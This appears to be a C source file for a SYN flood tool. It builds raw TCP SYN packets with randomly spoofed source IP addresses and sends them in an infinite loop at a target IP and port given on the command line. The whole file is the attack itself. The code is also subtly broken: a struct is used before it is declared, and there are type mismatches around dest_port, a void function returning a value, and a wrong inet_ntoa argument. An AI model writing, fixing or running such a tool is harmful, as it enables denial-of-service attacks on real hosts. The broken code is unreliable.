#include <errno.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <time.h>
#include <stdio.h>

extern int errno;

struct in_addr sour_ip;
struct in_addr dest_ip;
struct pseudo_header psh;
struct sockaddr_in addr;
int sendnum;
int sockfd;
char buf[2048];
char datagram[4096];
int datalen = 30;
int source_port = 8888;
int dest_port;

//needed for checksum calculation
struct pseudo_header
{
  unsigned int source_address;
  unsigned int dest_address;
  unsigned char placeholder;
  unsigned char protocol;
  unsigned short tcp_length;

  struct tcphdr tcp;
};

unsigned short checksum (unsigned short *data, int len)
{
  int result = 0;
  int i;
  size_t count;

  count = len;
  for (i = 0; i < len / 2; i++)
  {
    result += *data;
    data++;
    count -= 2;
  }

  if (count > 0)
    result += *(unsigned char *)data;

  while (result >> 16)
    result = (result & 0xffff) + (result >> 16);

  return ~result;
}

void send_data()
{
  sour_ip.s_addr = random();
  //IP header
  memset(datagram, 0, 4096);
  struct iphdr *ip = (struct iphdr *)datagram;
  ip->ihl = 5;
  ip->version = 4;
  ip->tos = 0;
  ip->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
  ip->id = htons(54321);
  ip->frag_off = htons(16384);
  ip->ttl = 64;
  ip->protocol = IPPROTO_TCP;
  ip->check = 0;
  ip->saddr = sour_ip.s_addr;
  ip->daddr = dest_ip.s_addr;
  ip->check = checksum((unsigned short *)datagram, ip->tot_len >> 1);

  //TCP header
  struct tcphdr *tcp = (struct tcphdr *)(datagram + sizeof(struct ip));
  tcp->source = htons(source_port);
  tcp->dest = htons(atoi(dest_port));
  tcp->seq = htonl(1105024978);
  tcp->ack_seq = 0;
  tcp->doff = sizeof(struct tcphdr) / 4;
  tcp->fin = 0;
  tcp->syn = 1;
  tcp->rst = 0;
  tcp->psh = 0;
  tcp->ack = 0;
  tcp->urg = 0;
  tcp->window = htons(14600);
  tcp->check = 0;
  tcp->urg_ptr = 0;

  psh.source_address = sour_ip.s_addr;
  psh.dest_address = addr.sin_addr.s_addr;
  psh.placeholder = 0;
  psh.protocol = IPPROTO_TCP;
  psh.tcp_length = htons(sizeof(struct tcphdr));

  memcpy(&psh.tcp, tcp, sizeof(struct tcphdr));

  tcp->check = checksum((unsigned short *)&psh, sizeof(struct pseudo_header));

  //Send the packet
  if (sendto(sockfd, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0)
  {
    printf("Error sending syn packet. Error number : %d . Error message : %s \n", errno, strerror(errno));
    exit(0);
  }
  else
  {
    char addr_p[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &sour_ip, addr_p, sizeof(addr_p));
    printf("Soure IP %s  sended SYN to destination IP %s.\n", addr_p, inet_ntoa(dest_ip.s_addr));
  }

  return 0;
}

int main(int argc, char *argv[])
{


  if (argc != 3)
  {
    printf("input err!ag:./a.out 192.168.103.108  8000\n");
    exit(1);
  }

  dest_ip.s_addr = inet_addr(argv[1]);
  dest_port = argv[2];

  sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sockfd == -1)
  {
    perror("socket()");
    return -1;
  }

  int on = 1;
  const int *val = &on;

  if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, val, sizeof(on)) < 0)
  {
    fprintf(stderr, "setsockopt IP_HDRINCL ERROR! \n");
    exit(1);
  }

  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = dest_ip.s_addr;

  while(1)
  {
    send_data(); /*发送SYN包*/
  }
  return 0;
}